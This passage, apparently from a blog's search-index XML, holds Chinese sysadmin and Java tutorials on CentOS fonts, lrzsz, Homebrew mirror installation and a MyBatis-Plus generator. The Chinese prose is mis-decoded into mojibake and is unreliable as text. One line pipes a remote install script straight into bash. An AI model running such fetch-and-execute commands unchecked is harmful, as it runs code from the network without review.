    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;æˆ‘ä»¬ä½¿ç”¨çš„Centosç³»ç»Ÿï¼Œé»˜è®¤æƒ…å†µä¸‹æ˜¯æ²¡æœ‰å®‰è£…ä¸­æ–‡å­—ä½“çš„ï¼Œæ‰€ä»¥å¦‚æœä½ åœ¨ä»£ç ä¸­ä½¿ç”¨Graphics2Dç»˜åˆ¶ä¸­æ–‡ï¼Œé‚£å¿…ç„¶ä¼šå› ä¸ºç³»ç»Ÿç¼ºå°‘å­—ä½“è€Œå¯¼è‡´å‡ºç°ä¹±ç çš„æƒ…å†µã€‚<br>&nbsp;&nbsp;&nbsp;&nbsp;æ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨ç³»ç»Ÿä¸Šå®‰è£…å¯¹åº”çš„å­—ä½“æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæœ¬æ–‡ä»¥å®‹ä½“ä¸ºä¾‹ã€‚</p>
<p>å­—ä½“ä¸‹è½½ï¼š</p>
<ul>
<li><a href="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/linux/simsun.ttc">ç‚¹å‡»ä¸‹è½½å®‹ä½“-å­—ä½“æ–‡ä»¶simsun.ttc</a></li>
</ul>
<p>æ³¨ï¼šå…¶ä»–å­—ä½“å¯ä»¥åˆ°ç½‘ä¸Šæœç´¢ä¸‹è½½ï¼Œæˆ–Windowsç³»ç»Ÿçš„å­—ä½“ç›®å½•ä¸‹æ‹·è´ï¼ˆC:\Windows\Fontsï¼‰</p>
<h4 id="å®‰è£…æ­¥éª¤"><a href="#å®‰è£…æ­¥éª¤" class="headerlink" title="å®‰è£…æ­¥éª¤"></a>å®‰è£…æ­¥éª¤</h4><h5 id="å®‰è£…å­—ä½“åº“å’Œç´¢å¼•ä¿¡æ¯"><a href="#å®‰è£…å­—ä½“åº“å’Œç´¢å¼•ä¿¡æ¯" class="headerlink" title="å®‰è£…å­—ä½“åº“å’Œç´¢å¼•ä¿¡æ¯"></a>å®‰è£…å­—ä½“åº“å’Œç´¢å¼•ä¿¡æ¯</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install fontconfig ttmkfdir mkfontscale</span><br></pre></td></tr></table></figure>
<h5 id="åˆ›å»ºç›®å½•ï¼Œä¸Šä¼ å­—ä½“æ–‡ä»¶"><a href="#åˆ›å»ºç›®å½•ï¼Œä¸Šä¼ å­—ä½“æ–‡ä»¶" class="headerlink" title="åˆ›å»ºç›®å½•ï¼Œä¸Šä¼ å­—ä½“æ–‡ä»¶"></a>åˆ›å»ºç›®å½•ï¼Œä¸Šä¼ å­—ä½“æ–‡ä»¶</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir -p /usr/share/fonts/chinese</span><br><span class="line"><span class="built_in">cd</span> /usr/share/fonts/chinese</span><br></pre></td></tr></table></figure>
<p>æ³¨ï¼šåˆ›å»ºchineseæ–‡ä»¶å¤¹ï¼Œå¹¶ä¸Šä¼ å­—ä½“æ–‡ä»¶åˆ°æ­¤ç›®å½•</p>
<h5 id="ç”Ÿæˆå­—ä½“åº“ç´¢å¼•ä¿¡æ¯"><a href="#ç”Ÿæˆå­—ä½“åº“ç´¢å¼•ä¿¡æ¯" class="headerlink" title="ç”Ÿæˆå­—ä½“åº“ç´¢å¼•ä¿¡æ¯"></a>ç”Ÿæˆå­—ä½“åº“ç´¢å¼•ä¿¡æ¯</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkfontscale</span><br><span class="line">mkfontdir</span><br></pre></td></tr></table></figure>
<p>æ³¨ï¼šåœ¨è·¯å¾„/usr/share/fonts/chineseä¸‹æ‰§è¡Œä¸Šé¢çš„è¿™ä¸¤æ¡å‘½ä»¤</p>
<h5 id="æ›´æ–°å­—ä½“ç¼“å­˜"><a href="#æ›´æ–°å­—ä½“ç¼“å­˜" class="headerlink" title="æ›´æ–°å­—ä½“ç¼“å­˜"></a>æ›´æ–°å­—ä½“ç¼“å­˜</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fc-cache</span><br></pre></td></tr></table></figure>
<h5 id="æŸ¥çœ‹å­—ä½“å®‰è£…æƒ…å†µ"><a href="#æŸ¥çœ‹å­—ä½“å®‰è£…æƒ…å†µ" class="headerlink" title="æŸ¥çœ‹å­—ä½“å®‰è£…æƒ…å†µ"></a>æŸ¥çœ‹å­—ä½“å®‰è£…æƒ…å†µ</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fc-list :lang=zh</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>å­—ä½“</tag>
      </tags>
  </entry>
  <entry>
    <title>lrzszä¸Šä¼ ä¸‹è½½</title>
    <url>/2017/07/21/linux-lrzsz/</url>
    <content><![CDATA[<p>lrzszæ˜¯ä¸€æ¬¾åœ¨linuxé‡Œå¯ä»£æ›¿ftpä¸Šä¼ å’Œä¸‹è½½çš„ç¨‹åºï¼Œå°å·§ã€é«˜æ€§èƒ½ã€æ–¹ä¾¿æ˜“ç”¨ã€‚</p>
<h4 id="å®‰è£…é…ç½®"><a href="#å®‰è£…é…ç½®" class="headerlink" title="å®‰è£…é…ç½®"></a>å®‰è£…é…ç½®</h4><p>å¦‚æœæ˜¯centosï¼Œå¯ä»¥ç›´æ¥é€šè¿‡yum install lrzszè¿›è¡Œå®‰è£…ï¼Œä¹Ÿå¯ä»¥ç”¨ä¸‹é¢çš„æ–¹å¼ä¸‹è½½æºæ–‡ä»¶è¿›è¡Œå®‰è£…ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://ohse.de/uwe/releases/lrzsz-0.12.20.tar.gz</span><br><span class="line">tar -zxvf lrzsz-0.12.20.tar.gz</span><br><span class="line"><span class="built_in">cd</span> lrzsz-0.12.20</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>å®‰è£…ä¹‹åï¼Œç›¸å…³çš„å‘½ä»¤æ–‡ä»¶åœ¨ç›®å½•/usr/local/binä¸‹ï¼Œå‘½ä»¤æ–‡ä»¶å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lrb lrx lrz lsb lsx lsz</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å»ºç«‹è½¯é“¾æ¥ï¼Œæ–¹ä¾¿æˆ‘ä»¬ç›´æ¥è¾“å‡ºå‘½ä»¤ä½¿ç”¨ï¼Œæˆ‘ä»¬è¿™é‡Œå°±ä»…å»ºç«‹lrzä¸Šä¼ å’Œlszä¸‹è½½çš„è½¯é“¾ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/bin</span><br><span class="line">ln -s /usr/<span class="built_in">local</span>/bin/lrz rz</span><br><span class="line">ln -s /usr/<span class="built_in">local</span>/bin/lsz sz</span><br></pre></td></tr></table></figure>
<p>Â </p>
<h4 id="å¦‚ä½•ä½¿ç”¨"><a href="#å¦‚ä½•ä½¿ç”¨" class="headerlink" title="å¦‚ä½•ä½¿ç”¨"></a>å¦‚ä½•ä½¿ç”¨</h4><p>1ï¼Œä¸Šä¼ ï¼Œä½¿ç”¨â€œrzâ€å‘½ä»¤ï¼Œä¼šå‘¼èµ·é€‰æ‹©æœ¬åœ°æ–‡ä»¶çš„çª—å£ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rz</span><br></pre></td></tr></table></figure>
<p>2ï¼Œä¸‹è½½ï¼Œä½¿ç”¨â€œsz æ–‡ä»¶åœ°å€â€å‘½ä»¤ï¼Œä¼šä¸‹è½½æŒ‡å®šæ–‡ä»¶åˆ°æœ¬åœ°ï¼Œå…·ä½“ä¸‹è½½åˆ°æœ¬åœ°çš„å“ªä¸ªç›®å½•å¯ä»¥åœ¨sshå·¥å…·ä¸Šè®¾ç½®ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sz ex.txt</span><br></pre></td></tr></table></figure>
<p>å®˜ç½‘ï¼š<a href="https://ohse.de/uwe/software/lrzsz.html">https://ohse.de/uwe/software/lrzsz.html</a></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>rz/sz</tag>
      </tags>
  </entry>
  <entry>
    <title>macå®‰è£…homebrewå·¥å…·</title>
    <url>/2020/06/28/mac-install-brew/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;Homebrewæ˜¯macé‡è¦çš„è½¯ä»¶åŒ…ç®¡ç†å·¥å…·ï¼Œè‹¥æ˜¯ä¸è£…ï¼Œé‚£å°±ç­‰äºå¤±å»äº†çµé­‚[æ‘Šæ‰‹]ã€‚å®‰è£…åœ°å€ï¼š<a href="https://brew.sh/index_zh-cn">brewå®˜ç½‘</a></p>
<p>å®˜ç½‘æä¾›çš„å®‰è£…æ–¹å¼å¦‚ä¸‹ï¼Œç›´æ¥åœ¨macç»ˆç«¯æ‰§è¡Œå³å¯ï¼Œä½†æ˜¯è¿™ä¸‹è½½é€Ÿåº¦ï¼Œé‚£å°±æœ‰ç‚¹çœ‹ä¸ä¸‹å»äº†ï¼Œå¶å°”è¿˜è¶…æ—¶ä¸­æ–­ï¼Œæ¯•ç«Ÿç«™ç‚¹åœ¨å›½å¤–ï¼Œå³ä½¿ç¿»å¢™äº† æ•ˆæœä¹Ÿä¸æ€ä¹ˆæ ·ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/bash -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘åœ¨ç½‘ä¸Šæœç´¢äº†å…¶ä»–çš„å®‰è£…æ–¹å¼ï¼Œæ‰¾åˆ°äº†ä¸‹é¢è¿™ç§æ¯”è¾ƒç®€å•çš„æ–¹æ³•ï¼Œè®°å½•å¦‚ä¸‹ã€‚</p>
<h4 id="å›½å†…é•œåƒç«™ç‚¹"><a href="#å›½å†…é•œåƒç«™ç‚¹" class="headerlink" title="å›½å†…é•œåƒç«™ç‚¹"></a>å›½å†…é•œåƒç«™ç‚¹</h4><table>
<thead>
<tr>
<th>é•œåƒç«™</th>
<th>é•œåƒåœ°å€</th>
</tr>
</thead>
<tbody><tr>
<td>ä¸­å›½ç§‘æŠ€å¤§å­¦é•œåƒç«™</td>
<td><a href="https://mirrors.ustc.edu.cn/brew.git">https://mirrors.ustc.edu.cn/brew.git</a></td>
</tr>
<tr>
<td>é˜¿é‡Œäº‘é•œåƒç«™</td>
<td><a href="https://mirrors.aliyun.com/homebrew/brew.git">https://mirrors.aliyun.com/homebrew/brew.git</a></td>
</tr>
<tr>
<td>æ¸…åå¤§å­¦é•œåƒç«™</td>
<td><a href="https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git">https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git</a></td>
</tr>
</tbody></table>
<h4 id="å®‰è£…æ­¥éª¤"><a href="#å®‰è£…æ­¥éª¤" class="headerlink" title="å®‰è£…æ­¥éª¤"></a>å®‰è£…æ­¥éª¤</h4><p>1ï¼Œæˆ‘ä»¬é€‰æ‹©ç§‘æŠ€å¤§å­¦çš„é•œåƒç«™æ¥å®‰è£…ï¼Œé¦–å…ˆï¼Œå…ˆå…‹éš†brewåˆ°â€œ/usr/local/Homebrewâ€ç›®å½•ï¼Œç„¶åè®¾ç½®è½¯é“¾</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo git <span class="built_in">clone</span> https://mirrors.ustc.edu.cn/brew.git /usr/<span class="built_in">local</span>/Homebrew</span><br><span class="line">sudo ln -s /usr/<span class="built_in">local</span>/Homebrew/bin/brew /usr/<span class="built_in">local</span>/bin/brew</span><br></pre></td></tr></table></figure>
<p>2ï¼Œç»§ç»­å…‹éš†homebrew-coreï¼Œå¹¶è®¾ç½®æƒé™ï¼Œè¿è¡Œæ›´æ–°å‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo git <span class="built_in">clone</span> https://mirrors.ustc.edu.cn/homebrew-core.git /usr/<span class="built_in">local</span>/Homebrew/Library/Taps/homebrew/homebrew-core</span><br><span class="line">sudo chown -R $(whoami) /usr/<span class="built_in">local</span>/Homebrew</span><br><span class="line">brew update</span><br></pre></td></tr></table></figure>
<p>3ï¼Œè®¾ç½®ç¯å¢ƒå˜é‡</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles&#x27;</span> &gt;&gt; ~/.zshrc </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles&#x27;</span> &gt;&gt; ~/.bash_profile</span><br><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br><span class="line"><span class="built_in">source</span> ~/.bash_profile</span><br></pre></td></tr></table></figure>
<p>4ï¼ŒéªŒè¯å®‰è£…æƒ…å†µ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew doctor</span><br><span class="line">brew -v</span><br></pre></td></tr></table></figure>
<h4 id="æ›´æ¢brewé•œåƒæº"><a href="#æ›´æ¢brewé•œåƒæº" class="headerlink" title="æ›´æ¢brewé•œåƒæº"></a>æ›´æ¢brewé•œåƒæº</h4><p>å¦‚æœä½ éœ€è¦æ›´æ¢brewæºï¼Œå¯ä»¥é€šè¿‡ä¸‹é¢çš„æ–¹å¼é‡æ–°è®¾ç½®</p>
<p>brewæºï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="string">&quot;<span class="subst">$(brew --repo)</span>&quot;</span></span><br><span class="line">git remote set-url origin https://mirrors.ustc.edu.cn/brew.git</span><br></pre></td></tr></table></figure>
<p>homebrew-coreæºï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="string">&quot;<span class="subst">$(brew --repo)</span>/Library/Taps/homebrew/homebrew-core&quot;</span></span><br><span class="line">git remote set-url origin https://mirrors.ustc.edu.cn/homebrew-core.git</span><br></pre></td></tr></table></figure>

<p>æ³¨æ˜ï¼šæœ¬æ–‡å‚è€ƒæ–‡ç« -<a href="https://blog.csdn.net/u010458765/article/details/104730037/">å›½å†…Homebrewå®‰è£…å¤ªæ…¢ - ç®€å•äº”æ­¥å¿«é€Ÿå®‰è£…</a></p>
]]></content>
      <categories>
        <category>mac</category>
      </categories>
      <tags>
        <tag>brew</tag>
      </tags>
  </entry>
  <entry>
    <title>ä»£ç ç”Ÿæˆå·¥å…·(mybatis-plus-generator)</title>
    <url>/2020/09/18/mybatis-plus-generator/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;ä»£ç ç”Ÿæˆå™¨ï¼Œå¯¹äºæˆ‘ä»¬æå‡å¼€å‘æ•ˆç‡è¿˜æ˜¯éå¸¸æœ‰ä»·å€¼çš„ï¼Œå¿«é€Ÿç”Ÿæˆä»£ç å’Œé¿å…æ‰‹è¯¯æ“ä½œï¼Œèƒ½ç»™æˆ‘ä»¬å‡å°‘äº†å¾ˆå¤šéº»çƒ¦ï¼Œåˆå¤šäº†ä¸€ç‚¹æ‘¸é±¼çš„æ—¶é—´[å·ç¬‘]ã€‚<br>&nbsp;&nbsp;&nbsp;&nbsp;ä»¥å‰æˆ‘ç”¨çš„æ¯”è¾ƒå¤šçš„æ˜¯easy codeï¼Œä½†æ˜¯éœ€è¦å®‰è£…æ’ä»¶ï¼Œé…ç½®æ¨¡ç‰ˆï¼Œæ‰€ä»¥å¤šå°‘è¿˜æ˜¯æœ‰äº›ä¸æ–¹ä¾¿ã€‚<br>&nbsp;&nbsp;&nbsp;&nbsp;è‡ªä»é¡¹ç›®æ”¹ç”¨mybatis-plusåï¼Œmybatis-plus-generatorå°±æˆäº†å®ƒçš„æ›¿ä»£å“ï¼Œå¾ˆæ–¹ä¾¿ï¼Œä¹Ÿå¾ˆçµæ´»ï¼Œä¸ªäººæ¨èä½¿ç”¨ã€‚</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;ä¸‹é¢æˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªSpringbootå¤šmoduleçš„é¡¹ç›®æ¥åšä¸‹æ¼”ç¤ºã€‚</p>
<h4 id="ä½¿ç”¨æ•™ç¨‹"><a href="#ä½¿ç”¨æ•™ç¨‹" class="headerlink" title="ä½¿ç”¨æ•™ç¨‹"></a>ä½¿ç”¨æ•™ç¨‹</h4><h5 id="é¡¹ç›®ç»“æ„"><a href="#é¡¹ç›®ç»“æ„" class="headerlink" title="é¡¹ç›®ç»“æ„"></a>é¡¹ç›®ç»“æ„</h5><p>ä¸‹é¢çš„treeå›¾ï¼Œæ˜¯æˆ‘ä»¬æœ¬æ¬¡æ¼”ç¤ºçš„é¡¹ç›®moduleå’Œpackageç»“æ„ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬ç”Ÿæˆä»£ç åçš„æƒ³è¦çš„æ•ˆæœï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pro-mall</span><br><span class="line">â”œâ”€â”€ pom.xml</span><br><span class="line">â”œâ”€â”€ application</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ pom.xml</span><br><span class="line">â”‚Â Â  â””â”€â”€ src</span><br><span class="line">â”œâ”€â”€ common</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ pom.xml</span><br><span class="line">â”‚Â Â  â””â”€â”€ src</span><br><span class="line">â”œâ”€â”€ mapper</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ pom.xml</span><br><span class="line">â”‚Â Â  â””â”€â”€ src.main</span><br><span class="line">â”‚Â Â          â”œâ”€â”€ java</span><br><span class="line">â”‚Â Â          â”‚Â Â  â””â”€â”€ cn.soilove.expro</span><br><span class="line">â”‚Â Â          â”‚Â Â              â”œâ”€â”€ mapper</span><br><span class="line">â”‚Â Â          â”‚Â Â              â”‚   â””â”€â”€ user</span><br><span class="line">â”‚Â Â          â”‚Â Â              â”‚Â Â      â””â”€â”€ UserMapper.java</span><br><span class="line">â”‚Â Â          â”‚Â Â              â””â”€â”€ model</span><br><span class="line">â”‚Â Â          â”‚Â Â                  â””â”€â”€ user</span><br><span class="line">â”‚Â Â          â”‚Â Â                      â””â”€â”€ User.java</span><br><span class="line">â”‚Â Â          â””â”€â”€ resources</span><br><span class="line">â”‚Â Â              â””â”€â”€ mapper</span><br><span class="line">â”‚Â Â                  â””â”€â”€ user</span><br><span class="line">â”‚Â Â                      â””â”€â”€ UserMapper.xml</span><br><span class="line">â”œâ”€â”€ service</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ pom.xml</span><br><span class="line">â”‚Â Â  â””â”€â”€ src.main</span><br><span class="line">â”‚Â Â          â””â”€â”€ java</span><br><span class="line">â”‚Â Â              â””â”€â”€ cn.soilove.expro</span><br><span class="line">â”‚Â Â                          â””â”€â”€ service</span><br><span class="line">â”‚Â Â                              â””â”€â”€ user</span><br><span class="line">â”‚Â Â                                  â”œâ”€â”€ UserService.java</span><br><span class="line">â”‚Â Â                                  â””â”€â”€ impl</span><br><span class="line">â”‚Â Â                                      â””â”€â”€ UserServiceImpl.java</span><br><span class="line">â”œâ”€â”€ web-admin</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ pom.xml</span><br><span class="line">â”‚Â Â  â””â”€â”€ src</span><br><span class="line">â”œâ”€â”€ web-api</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ pom.xml</span><br><span class="line">â”‚Â Â  â””â”€â”€ src</span><br><span class="line">â””â”€â”€ web-open-api</span><br><span class="line">    â”œâ”€â”€ pom.xml</span><br><span class="line">    â””â”€â”€ src</span><br></pre></td></tr></table></figure>
<h5 id="å¼•å…¥POMä¾èµ–"><a href="#å¼•å…¥POMä¾èµ–" class="headerlink" title="å¼•å…¥POMä¾èµ–"></a>å¼•å…¥POMä¾èµ–</h5><p>ç¬¬ä¸€æ­¥ï¼Œé™¤å¼€mybatis-plusæ­£å¸¸å¼•ç”¨çš„åŒ…ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å¼•å…¥generatorå’Œvelocityï¼Œæ¥æä¾›ä»£ç å’Œæ¨¡ç‰ˆçš„ç”Ÿæˆã€‚</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mybatis-plus.version</span>&gt;</span>3.4.0<span class="tag">&lt;/<span class="name">mybatis-plus.version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">velocity.version</span>&gt;</span>2.2<span class="tag">&lt;/<span class="name">velocity.version</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-plus-generator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;mybatis-plus.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.velocity<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>velocity-engine-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;velocity.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="ç¼–å†™å·¥å…·ç±»"><a href="#ç¼–å†™å·¥å…·ç±»" class="headerlink" title="ç¼–å†™å·¥å…·ç±»"></a>ç¼–å†™å·¥å…·ç±»</h5><p>ç„¶åï¼Œç¼–å†™å·¥å…·ç±»ï¼Œç›´æ¥è¿è¡Œç”Ÿæˆæƒ³è¦çš„ä»£ç ã€‚ä¸‹é¢çš„javaå·¥å…·ç±»æ˜¯é€šè¿‡å®˜ç½‘ä»£ç ç¤ºä¾‹æ”¹é€ è€Œæ¥ï¼Œæ”¯æŒå¤šmoduleæŒ‡å®šã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.soilove.expro.framework.generator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.FieldFill;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.exceptions.MybatisPlusException;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.toolkit.StringPool;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.AutoGenerator;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.InjectionConfig;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.config.*;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.config.po.LikeTable;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.config.po.TableFill;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.config.po.TableInfo;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.config.rules.DateType;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.config.rules.NamingStrategy;</span><br><span class="line"><span class="keyword">import</span> com.google.common.collect.Maps;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.StringUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * MyBatisPlusGenerator ä»£ç ç”Ÿæˆå·¥å…·</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: Chen GuoLin</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2020-02-11 11:57</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyBatisPlusGenerator</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ•°æ®åº“é“¾æ¥ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String url = <span class="string">&quot;jdbc:mysql://k.32e.co:3306/ex-pro?allowMultiQueries=true&amp;useUnicode=true&amp;characterEncoding=UTF-8&amp;autoReconnect=true&amp;useSSL=false&amp;zeroDateTimeBehavior=convertToNull&amp;&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String driver_name = <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String user = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String password = <span class="string">&quot;xxxxx&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * moduleå­æ¨¡å—ç›¸å¯¹è·¯å¾„</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">module_path</span></span>&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * serviceç±»æ‰€åœ¨module</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String service = <span class="string">&quot;/service&quot;</span>;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * è¡¨å®ä½“å¯¹è±¡æ‰€åœ¨module</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String entity = <span class="string">&quot;/mapper&quot;</span>;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * mapperæ¥å£å’Œxmlæ–‡ä»¶æ‰€åœ¨module</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String mapper = <span class="string">&quot;/mapper&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * é¡¹ç›®javaåŒ…è·¯å¾„</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String base_path = <span class="string">&quot;cn.soilove.expro&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ç±»çš„ä½œè€…æ³¨é‡Š</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String author = <span class="string">&quot;Chen GuoLin&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String projectPath = System.getProperty(<span class="string">&quot;user.dir&quot;</span>);</span><br><span class="line"></span><br><span class="line">        String bizName = scanner(<span class="string">&quot;ä¸šåŠ¡åç§°&quot;</span>);</span><br><span class="line">        String[] tableNames = scanner(<span class="string">&quot;è¡¨å(å¤šä¸ªè‹±æ–‡é€—å·åˆ†éš”)&quot;</span>).split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä»£ç ç”Ÿæˆå™¨</span></span><br><span class="line">        AutoGenerator autoGenerator = <span class="keyword">new</span> AutoGenerator();</span><br><span class="line">        